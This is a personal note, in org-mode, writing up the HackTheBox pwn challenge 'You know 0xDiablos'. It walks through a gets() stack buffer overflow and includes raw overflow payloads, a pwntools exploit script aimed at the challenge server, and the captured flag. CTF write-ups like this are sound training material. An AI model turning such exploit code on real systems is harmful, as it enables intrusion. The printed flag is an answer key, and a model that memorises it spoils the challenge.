@@ -1,0 +1,73 @@
+:PROPERTIES:
+:ID:       7090b7fc-55cd-4c7e-ad21-8a064e6a6e33
+:END:
+#+title: You know 0xDiablos
+#+filetags: :pwn:ctf:hackthebox:writeup:
+
+* Description
+#+begin_quote
+I missed my flag
+#+end_quote
+
+** Extras
+A file is provided, names ~vuln~.
+
+* Recon
+Running ~file~ on ~vuln~ tells us that its an ELF 32-bit LSB executable, not stripped.
+
+Executing ~vuln~ waits for stdin, giving it any value, it will return it printed to stdout.
+
+Using ~objdump~ to see the assembly code, we notice two interesting functions: *vuln* at address 08049272 and *flag* at address 080491e2.
+
+Inside the *vuln* function we can see a call to the vulnerable function ~gets~. This indicates that its a [[id:b7ae8541-0256-4fb4-b1a3-5fa0c85c0ccb][BOF]] vulnerability.
+
+* Foothold
+The function ~gets~ writes to [ebp-0xb8], if we were to give exactly 0xb8 bytes, the function should behave normally, adding an extra byte should result in a segmentation fault error. Example of 184 bytes input:
+#+begin_example
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+#+end_example
+
+Now we need to overflow the base pointer, and since we are working with 32 bit ELF, only 4 bytes are enough to do so:
+#+begin_example
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+#+end_example
+
+The payload will come after the last "B", since that is where the return address to "main" is currently located. We replace it with the address of the flag function, which should print out the correct flag.
+#+begin_example
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\xe2\x91\x04\x08
+#+end_example
+
+Using [[id:ed95b5a1-25d6-4c63-91f8-11a818a96416][Ghidra]], we can see that the flag function requires two specific arguments. If the arguments are not provided, a default message is printed, otherwise, two comparisons are made for 0xdeadbeef and 0xc0ded00d.
+
+Since we are dealing with x86, the subroutine's arguments are pushed on the stack (in x64, registers are used first) after the return address. Since we are "building" the stack frame in our payload, we need to provide three things:
+1. A dummy return address.
+   We used the function "frame_dummy" that is already included in the binary.
+2. The second argument 0xdeadbeef.
+3. The first argument 0xc0ded00d.
+
+Note: to replicate the same behavior as in the server, a file named "flag.txt" was created as seen in Ghidra.
+
+The payload becomes:
+#+begin_example
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\xe2\x91\x04\x08\xe0\x91\x04\x08\xef\xbe\xad\xde\r\xd0\xde\xc0
+#+end_example
+
+The above was performed in pwntools.
+#+begin_src python
+from pwn import *
+flag_add = p32(0x080491e2)
+payload = b'A' * 0xb8
+payload += b'B' * 4
+payload += flag_add
+payload += p32(0x080491e0)
+payload += p32(0xdeadbeef)
+payload += p32(0xc0ded00d)
+p = remote('167.172.56.232', 30401)
+p.send(payload)
+p.interactive()
+#+end_src
+
+* Flag
+#+begin_example
+HTB{0ur_Buff3r_1s_not_healthy}
+#+end_example
